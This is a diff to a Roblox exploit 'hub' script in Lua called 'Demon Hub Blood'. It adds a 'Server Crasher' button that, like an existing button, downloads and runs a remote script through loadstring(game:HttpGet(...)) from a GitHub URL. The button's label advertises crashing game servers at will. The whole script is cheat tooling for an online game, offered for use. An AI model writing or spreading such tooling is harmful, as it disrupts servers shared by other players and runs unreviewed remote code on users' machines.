@@ -4,7 +4,7 @@ local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.S
 Event:FireServer(A_1, A_2)
 -- Main Script Code
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("Demon Hub Blood (8/2/2022)", "BloodTheme")
+local Window = Library.CreateLib("Demon Hub Blood (5/12/2020)", "BloodTheme")
 
 --Main
 local Main = Window:NewTab("Main")
@@ -3522,6 +3522,10 @@ local TabSection = Tab:NewSection("Sword Form's Beta.")
 
 -- Evil Script.
 TabSection:NewButton("Solex Premium Hub 0.2", ":)", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Demon1131/Hubs/main/Zsycho%20Premium%20Hub",true))()
+end)
+
+TabSection:NewButton("Server Crasher", "Crasher The Server As Much As You Want :)", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Demon1131/Hubs/main/Zsycho%20Premium%20Hub",true))()
 end)
 
